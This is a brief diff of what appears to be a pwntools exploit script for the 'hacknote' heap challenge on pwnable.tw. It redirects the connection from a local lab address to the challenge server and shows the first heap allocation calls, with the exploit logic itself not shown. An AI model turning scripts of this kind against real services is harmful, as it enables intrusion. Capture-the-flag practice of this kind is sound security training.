@@ -17,7 +17,8 @@ def delete(index):
 
 
 # conn=process("./hacknote")
-conn=remote("10.131.1.19",60012)
+conn=remote("chall.pwnable.tw",10102)
+# conn=remote("10.131.1.19",60012)
 libc=ELF("./bc.so.6")
 add(64,"aaa")
 add(64,"aaa")
